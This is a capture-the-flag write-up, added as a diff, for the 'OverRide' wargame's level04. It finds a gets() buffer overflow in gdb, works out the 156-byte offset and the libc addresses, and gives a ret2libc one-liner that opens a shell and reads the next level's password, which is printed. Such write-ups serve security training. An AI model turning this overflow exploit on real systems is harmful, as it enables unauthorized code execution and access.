@@ -1,0 +1,53 @@
+in this program we have a fork , and a gets wich is vulnerable to buffer overflow
+
+and the ptrace function also block us form using exec()
+
+   0x080486d6 <+14>:	call   0x8048550 <fork@plt>
+
+
+   0x08048746 <+126>:	call   0x8048570 <ptrace@plt>
+   0x0804874b <+131>:	movl   $0x8048903,(%esp)
+   0x08048752 <+138>:	call   0x8048500 <puts@plt>
+   0x08048757 <+143>:	lea    0x20(%esp),%eax
+   0x0804875b <+147>:	mov    %eax,(%esp)
+   0x0804875e <+150>:	call   0x80484b0 <gets@plt>
+
+
+so we need to fiund the offset to overflow and rewrite eip address with system addresss
+
+
+(gdb) set follow-fork-mode child
+(gdb) r
+Starting program: /home/users/level04/level04
+[New process 1869]
+Give me some shellcode, k
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2A
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1869]
+0x41326641 in ?? ()
+
+we have segfault at 0x41326641 wich mean offset is equal to 156
+
+(gdb) find 0xf7e2b000,+99999999,"/bin/sh"
+0xf7f897ec
+warning: Unable to access target memory at 0xf7fd3b74, halting search.
+1 pattern found.
+(gdb) p system
+$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
+(gdb) p exit
+$2 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb)
+
+
+now we have address of system exit and "/bin/sh"
+
+
+exploit : 
+
+level04@OverRide:~$ (python -c 'print("A"*156+"\xf7\xe6\xae\xd0"[::-1]+"\xf7\xe5\xeb\x70"[::-1]+"\xf7\xf8\x97\xec"[::-1])'; cat) | ./level04
+Give me some shellcode, k
+cd ../level05
+cat .pass
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
